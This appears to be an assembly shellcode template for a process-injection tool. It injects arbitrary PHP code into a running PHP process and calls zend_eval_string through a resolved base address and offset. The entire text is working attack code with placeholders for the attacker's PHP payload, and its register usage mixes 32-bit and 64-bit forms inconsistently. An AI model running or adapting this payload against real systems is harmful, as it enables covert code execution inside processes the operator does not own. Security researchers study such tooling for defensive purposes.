jmp execute_php_code_main

// FRAGMENT:asminject_copy_bytes.s:FRAGMENT

execute_php_code_main:

	// copy the PHP name and code string to arbitrary read/write memory
	mov edi, arbitrary_read_write_data_address[eip]
	lea esi, php_name[eip]
	push ecx
	mov ecx, [VARIABLE:phpname.length:VARIABLE]
	add ecx, 2												# null terminator
	//call asminject_copy_bytes
	rep movsb
	pop ecx
	
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 128
	lea esi, php_code[eip]
	push ecx
	mov ecx, [VARIABLE:phpcode.length:VARIABLE]
	add ecx, 2												# null terminator
	// call asminject_copy_bytes
	rep movsb
	pop ecx
	// END: copy the PHP name and code string to arbitrary read/write memory
	
	// BEGIN: call zend_eval_string("arbitrary PHP code here")
	push r10
	push edx
	//even though ebx is not used here, if the push/pop for it isn't present, the target process will segfault on my system
	push ebx
	push eax
	// arbitrary name
	mov eax, arbitrary_read_write_data_address[eip]
	mov edx, eax
	xor esi, esi				# return value pointer
	// # PHP code
	mov eax, arbitrary_read_write_data_address[eip]
	add eax, 128
	mov edi, eax
	mov r10, [BASEADDRESS:.+/php[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:^zend_eval_string$:RELATIVEOFFSET]
	call r10
	pop eax
	pop ebx
	pop edx
	pop r10
	// END: call zend_eval_string("arbitrary PHP code here")

SHELLCODE_SECTION_DELIMITER
	
php_code:
	.ascii "[VARIABLE:phpcode:VARIABLE]\0"

php_name:
	.ascii "[VARIABLE:phpname:VARIABLE]\0"

